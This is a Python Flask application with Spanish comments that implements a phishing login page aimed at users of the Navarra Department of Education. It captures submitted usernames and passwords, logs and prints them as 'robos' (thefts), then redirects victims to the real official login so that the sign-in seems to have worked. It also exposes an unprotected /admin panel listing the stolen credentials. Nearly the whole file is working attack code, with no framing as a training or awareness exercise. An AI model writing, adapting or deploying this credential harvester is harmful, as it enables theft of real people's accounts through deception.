from flask import Flask, render_template, request, redirect, url_for, flash
import datetime

app = Flask(__name__)
# Clave secreta necesaria para usar 'flash'
app.secret_key = 'una_clave_secreta_muy_fuerte_para_navarra'

# --- SIMULADOR DE BASE DE DATOS DE ROBO ---
# Aquí guardarías los datos robados en un entorno real (CSV, DB, etc.)
ROBOS_LOG = []

def log_robo(username, password, timestamp):
    """Función para registrar el evento de robo."""
    robo_data = {
        "timestamp": timestamp,
        "usuario_capturado": username,
        "contrasena_capturada": password
    }
    ROBOS_LOG.append(robo_data)
    print(f"\n--- 🚨 ROBO REGISTRADO ---")
    print(f"Usuario: {username}, Contraseña: {password}")
    print("-------------------------\n")
    return robo_data

# -------------------------------------------------------------------
# RUTA PRINCIPAL: Muestra la página de login de phishing
# -------------------------------------------------------------------
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # 1. Captura de Datos
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            flash("Por favor, introduce usuario y contraseña.")
            return render_template('login_form.html')

        # 2. Registro (El "Robo")
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_robo(username, password, timestamp)

        # 3. El "Phishing Real" - Redirección
        # AQUÍ VA LA URL REAL de la Consejería de Educación de Navarra
        URL_DESTINO_REAL = "https://www.educacion.navarra.es/login" # <-- ¡CAMBIA ESTO!

        # Redireccionamos al usuario al sitio oficial, dando la ilusión de que el login fue exitoso
        return redirect(URL_DESTINO_REAL)

    # Si es GET, solo mostramos el formulario
    return render_template('login_form.html')

# -------------------------------------------------------------------
# RUTA DE ADMINISTRACIÓN (Opcional: Para ver lo que se ha robado)
# -------------------------------------------------------------------
@app.route('/admin')
def admin():
    return f"""
    <h1>📊 Panel de Monitoreo de Phishing</h1>
    <h2>Total de Capturas: {len(ROBOS_LOG)}</h2>
    <p>Últimos 5 registros:</p>
    <pre>{ROBOS_LOG[-5:]}</pre>
    """

if __name__ == '__main__':
    # Ejecutar en modo debug para ver cambios al instante
    app.run(debug=True, port=5000)
